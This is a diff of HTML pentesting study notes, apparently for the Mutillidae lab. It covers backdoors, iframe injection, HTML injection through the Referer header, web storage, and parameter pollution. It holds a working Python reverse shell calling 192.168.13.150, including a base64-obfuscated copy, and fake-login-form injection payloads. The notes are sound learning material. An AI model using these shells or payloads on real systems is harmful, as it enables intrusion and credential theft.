@@ -29,14 +29,16 @@ Set up a listener on attacker machine
 python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.13.150',1234))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
 </pre>
 For obfuscation , we could also base64 encode and decode string
+<pre>
 python -c "exec('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\n4oCYMTkyLjE2OC4xMy4xNTDigJksOTAwMCkpCndoaWxlIDE6ICBwcm9jID0gc3VicHJvY2Vzcy5Q\nb3BlbihzLnJlY3YoMTAyNCksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0\nZGVycj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSk7cy5zZW5kKHByb2Mu\nc3Rkb3V0LnJlYWQoKStwcm9jLnN0ZGVyci5yZWFkKCkp\n'.decode('base64'))"
+</pre>
 </li>
 <li><h3>Method-4: Meterpreter Shell</h3>
 Deploying a Meterpreter shell is one way to create a well obfuscated persisitent backdoor to any OS we have shell acess on.How to create and deploy a meterpreter shell is a different and vast topic altogether.
 </li>
 </ul>
 <li><h2>Frame Source injection</h2>
-	Similar to a Remote file inclusion vulnerability. We can include any special characters once they  are URL encoded to cause an XSS attack on the site. We can include any iframe of our choice such as a malicious form and then steal user credentials or make cross-domain requests. We could inject a remote page into the src of the iframe.
+	Similar to a Remote file inclusion vulnerability. We can include any special characters once they  are URL encoded to cause an XSS attack on the site. We can include any iframe of our choice such as a malicious form and then steal user credentials or make cross-domain requests. We could inject a remote page into the src of the iframe. Note that iframes cannot access the cookies of the parent site, however can run arbitary javascript if not run in sandbox mode.
 	<p> iframe sources should never be allowed to be controlled by user input, as the iframe can load potential malware from other site. There are other security risks as well. I found this blog very helpful.
 	<a href="https://stackoverflow.com/questions/7289139/why-are-iframes-considered-dangerous-and-a-security-risk?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa">Why Iframes pose a security risk?</a>
 	We can corrupt the iframe src to load xss attacking page from our server or even an AJAX request to our site. We can inject this to the vulnerable parameter and let the fun unroll, or even a remote html page from the attacking server of our choice. 
@@ -67,8 +69,7 @@ Deploying a Meterpreter shell is one way to create a well obfuscated persisitent
 			Using Burp intercept the outgoing request. In the DNS lookup page, I am targetting the vulnerability labelled as <b>"Those Back Buttons"</b>.
 		</p>
 			<p>
-				In the beginning , visit this page from another page. As MITM simulation, intercept using Burp, and modify the Referer header to something like this &lt+&gt to see where the payload is getting injected. When the page loads, inspect the backbutton which loads the value from 
-				<i>window.href.location</i>. Its value will be like this.
+				In the beginning , visit this page from another page. As MITM simulation, intercept using Burp, and modify the Referer header to something like this <i>&lt+&gt</i> to see where the payload is getting injected. When the page loads, inspect the backbutton which loads the value from <i>window.href.location</i>. Its value will be like this.
 		<pre>
 &lta onclick="document.location.href='&lt+&gt';"&gt
 		</pre>
@@ -76,14 +77,38 @@ Deploying a Meterpreter shell is one way to create a well obfuscated persisitent
 		So , now knowing the context and the fact that there is no encoding or sanitization defense, we do this.
 	</p>
 		<pre>
-';"&gt&ltform action='hacked'&gt&ltinput type='password' name='password' placeholder='password'/&lt&gtinput name='name' placeholder='name'/&gt&ltinput type='submit'/&gt&lt/form&gt&lt!--
+';"&gt&ltform action='hacked'&gt&ltinput type='password' name='password' placeholder='password'/&gt&ltinput name='name' placeholder='name'/&gt&ltinput type='submit'/&gt&lt/form&gt&lt!--
 		</pre>
 	</p>
 	</li>
-	<li><h3>DOM Manipulation</h3></li>
-	<li><h3>Cookie Manipulation</h3></li>
-	<li><h3>HTTP Parameter Pollution</h3></li>
+	<li><h3>Cookie Manipulation</h3>
+<p>We do an MITM, and then modify the victim's cookie to be something that causes an HTML injection.
+
+</p>
+
+	</li>
+
+	<li><h3>HTTP Parameter Pollution</h3>
+	<p>HTTP parameter pollution is just a method to repeat HTTP parameters and carry out a malicious attack.HTTP standards do not specify how a server should handle repeated parameters. While carrying out an attack, we can use this technique to bypass setting up some IDS, if the repeated parameter value, is concatenated by the backend server to have the desired payload. It is not a standalone attack</p>
+
+
+	</li> 
+
+	<li><h3>DOM Manipulation</h3>
+		We manipulate the DOM things such as Web Storage. 
+		Web storage provides larger storage than cookies and follows the same origin policies. It can be accessed via javascript, and is a HTML5 w3 standard. What it means is one site cannot modify or access the web storage for other site, if their origin is different.Also, this can be done via Javascript or some malicious browser extension. Secondly, for the injection via WebDOM to work the Web Storage must be reflected somewhere on the page unsanitized. The localstorage object persists until manually removed, and the session storage object is deleted, once the user closes the browser window(It is valid for one session of the browser).
+		<br>
+		In mutillidae try this overused session expired payload, on the page <b>html5-storage.php</b>.
+		<pre>
+&gt&ltform action='hacked'&gt&ltinput type='password' name='password' placeholder='password'/&gt&ltinput name='name' placeholder='name'/&gt&ltinput type='submit'/&gt&lt/form&gt&lt!--
+		</pre>
+	</li>
 	</ul>
+</li>
+<li><h2>Javascript injection</h2>
+<p>
+	Same technique of exiting the context but instead of the HTML we would be injecting javascript. A Javascript injection attack is also known as XSS. 
+</p>
 </li>
 
 
